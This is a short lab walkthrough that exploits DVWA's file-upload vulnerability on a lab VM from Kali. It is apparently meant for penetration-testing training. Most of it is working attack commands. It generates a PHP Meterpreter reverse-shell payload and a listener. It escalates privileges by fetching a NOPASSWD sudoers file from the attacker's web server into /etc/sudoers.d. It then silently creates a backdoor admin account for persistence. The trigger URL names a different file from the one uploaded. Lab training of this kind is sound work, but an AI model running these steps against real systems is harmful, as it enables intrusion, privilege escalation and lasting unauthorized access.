# Sample Scenarios

## DVWA  Upload function
- Assumptions: `192.168.8.10` is Kali's IP and `192.168.8.149` is the Hullu's IP
- In Kali: browse `http://192.168.8.149/dvwa/vulnerabilities/upload/` and see how it works
- Open `terminal 1`
    Prepare the payload
    ```sh      
    cd ~/Desktop && msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.8.10 lport=4444 -f raw -o shell_test.php
    ```
    Start `Meterpreter` listening session
    ```sh
    sudo msfconsole -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set lhost 192.168.8.10; set lport 4444; exploit"
    ```
- In Firefox browser upload the `shell_test.php` in `http://192.168.8.149/dvwa/vulnerabilities/upload/` 

- Activate the upload `shell_test.php` by browsing this link in Firefox `http://192.168.8.149/dvwa/hackable/uploads/shell22.php`

- In `terminal 1`, the `Meterpreter` session should be established, try `shell` then `id`

- Open `terminal 2`
    Create `sudoers` file for the account `apache`
    ```sh
    cd ~/Desktop && echo 'apache ALL=(ALL) NOPASSWD: ALL' > apache
    ```
    Start webserver in the same work path
    ```sh
    python3 -m http.server 8000
    ```

- In `terminal 1`, in the established shell `Meterpreter` session
    Check the privilege level of the current account
    ```sh
    sudo -n id
    ```
    Upload the created `sudoers` file to `Hullu` VM
    ```sh
    wget http://192.168.8.10:8000/apache -O /etc/sudoers.d/apache
    ```
    Re-check the privilege level of the current account
    ```sh
    sudo -n id
    ```
- Create persistence privilege account
    ```sh
    { echo -e "aaa\naaa" | sudo adduser -G wheel david && sudo echo '%wheel ALL=(ALL) ALL' >> /etc/sudoers; } >/dev/null 2>&1
    ```